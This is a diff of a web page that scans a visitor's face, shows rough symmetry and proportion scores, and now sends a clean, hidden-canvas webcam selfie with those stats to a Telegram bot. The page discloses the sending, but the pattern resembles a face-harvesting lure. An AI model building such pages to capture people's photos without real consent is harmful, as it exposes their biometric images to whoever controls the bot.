@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Face Scan + Telegram Test</title>
+  <title>Face Scan + Telegram (Selfie)</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -149,7 +149,6 @@
       font-weight: 600;
       color: #111827;
     }
-
     @media (max-width: 600px) {
       .container { padding: 18px; }
       h1 { font-size: 20px; }
@@ -158,12 +157,14 @@
 </head>
 <body>
   <div class="container">
-    <h1>Face Scan + Stats</h1>
-    <p class="subtitle">Local test: face scan, basic symmetry stats & Telegram send</p>
+    <h1>Face Scan + Selfie → Telegram</h1>
+    <p class="subtitle">3 sec scan, stats calculate, CLEAN selfie send to your bot</p>
 
     <div class="video-container">
       <video id="video" autoplay playsinline></video>
       <canvas id="canvas"></canvas>
+      <!-- hidden canvas for raw selfie -->
+      <canvas id="rawCanvas" style="display:none;"></canvas>
     </div>
 
     <div class="controls">
@@ -193,6 +194,9 @@
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
+    const rawCanvas = document.getElementById("rawCanvas");
+    const rctx = rawCanvas.getContext("2d");
+
     const startBtn = document.getElementById("startBtn");
     const scanBtn = document.getElementById("scanBtn");
     const stopBtn = document.getElementById("stopBtn");
@@ -234,7 +238,7 @@
       return Math.sqrt(dx*dx + dy*dy);
     }
 
-    // indices from MediaPipe FaceMesh docs (rough only)
+    // indices (rough) from FaceMesh docs
     const IDX = {
       chin: 152,
       forehead: 10,
@@ -257,7 +261,6 @@
       const faceRatio = faceHeight > 0 ? faceWidth / faceHeight : 0;
 
       const noseWidth = dist(lm(IDX.noseLeft), lm(IDX.noseRight));
-      const noseHeight = dist(lm(IDX.forehead), lm(IDX.noseTip)); // rough
       const noseWidthRatio = faceWidth > 0 ? noseWidth / faceWidth : 0;
 
       const eyeDist = dist(lm(IDX.leftEyeOuter), lm(IDX.rightEyeOuter));
@@ -266,24 +269,21 @@
       const mouthWidth = dist(lm(IDX.mouthLeft), lm(IDX.mouthRight));
       const lipToNoseRatio = noseWidth > 0 ? mouthWidth / noseWidth : 0;
 
-      // symmetry: compare left cheek–nose vs right cheek–nose distance
       const leftSym = dist(lm(IDX.leftCheek), lm(IDX.noseTip));
       const rightSym = dist(lm(IDX.rightCheek), lm(IDX.noseTip));
       const symDiff = Math.abs(leftSym - rightSym);
       let symmetryScore = 100 - (symDiff / faceWidth) * 100 * 2;
       symmetryScore = Math.max(0, Math.min(100, symmetryScore || 0));
 
-      // rough face shape
       let faceShape = "Balanced";
       if (faceRatio < 0.65) faceShape = "Long";
       else if (faceRatio > 0.8) faceShape = "Wide";
       else faceShape = "Oval";
 
-      // overall score -> simple average weighting
       let overall = (
         symmetryScore * 0.6 +
-        (1 - Math.abs(eyeFaceRatio - 0.46)) * 40 + // 0.40–0.52 sweet spot
-        (1 - Math.abs(noseWidthRatio - 0.33)) * 30 // around ~0.3 sweet spot
+        (1 - Math.abs(eyeFaceRatio - 0.46)) * 40 +
+        (1 - Math.abs(noseWidthRatio - 0.33)) * 30
       );
       overall = Math.max(0, Math.min(100, overall || 0));
 
@@ -327,7 +327,7 @@
 
     async function sendToTelegramDirect(imageBlob, stats) {
       try {
-        setStatus("Sending to Telegram bot...", "loading");
+        setStatus("Sending clean selfie to Telegram bot...", "loading");
 
         const caption = `
 Face scan result:
@@ -343,7 +343,7 @@ Lips ratio: ${stats.lipToNoseRatio}
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("caption", caption);
-        formData.append("photo", imageBlob, "face.png");
+        formData.append("photo", imageBlob, "face_selfie.jpg");
 
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
@@ -353,7 +353,7 @@ Lips ratio: ${stats.lipToNoseRatio}
         if (!res.ok) {
           throw new Error("Telegram HTTP " + res.status);
         }
-        setStatus("Scan complete, stats shown & data sent to Telegram.", "active");
+        setStatus("Scan complete, selfie + stats sent to Telegram.", "active");
       } catch (err) {
         console.error(err);
         setStatus("Failed to send to Telegram: " + err.message, "error");
@@ -373,6 +373,7 @@ Lips ratio: ${stats.lipToNoseRatio}
         const landmarks = results.multiFaceLandmarks[0];
         lastLandmarks = landmarks;
 
+        // live mesh for UI only
         drawConnectors(ctx, landmarks, FACEMESH_TESSELATION, {
           color: "#C0C0C070",
           lineWidth: 1
@@ -410,7 +411,18 @@ Lips ratio: ${stats.lipToNoseRatio}
             const stats = computeFaceStats(lastLandmarks);
             renderStats(stats);
 
-            const dataUrl = canvas.toDataURL("image/png");
+            // === CLEAN SELFIE CAPTURE HERE ===
+            rawCanvas.width = video.videoWidth;
+            rawCanvas.height = video.videoHeight;
+            rctx.save();
+            rctx.clearRect(0, 0, rawCanvas.width, rawCanvas.height);
+            // selfie mirror effect (same as video preview)
+            rctx.translate(rawCanvas.width, 0);
+            rctx.scale(-1, 1);
+            rctx.drawImage(video, 0, 0, rawCanvas.width, rawCanvas.height);
+            rctx.restore();
+
+            const dataUrl = rawCanvas.toDataURL("image/jpeg", 0.9);
             const blob = dataURLtoBlob(dataUrl);
 
             sendToTelegramDirect(blob, stats);
